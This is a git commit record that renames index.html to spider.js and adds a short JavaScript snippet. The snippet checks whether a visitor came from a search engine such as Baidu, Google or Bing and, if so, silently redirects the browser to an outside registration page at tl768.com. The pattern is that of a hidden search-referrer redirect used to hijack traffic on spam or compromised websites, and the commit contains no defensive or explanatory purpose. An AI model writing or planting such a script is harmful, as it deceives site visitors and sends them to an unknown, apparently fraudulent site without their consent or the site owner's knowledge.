158ec4942a178eb31b9c300de7b2ff58239fb442
Th4ck-Team <57929473+Th4ck-Team@users.noreply.github.com>
2020-11-19 15:41:16 +0800

    Update and rename index.html to spider.js

---
+++ spider.js
@@ -0,0 +1,6 @@
+var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
+var where =document.referrer;
+if(regexp.test(where))
+{
+window.location.href='https://www.tl768.com/dcxf/reg_m.html'
+}
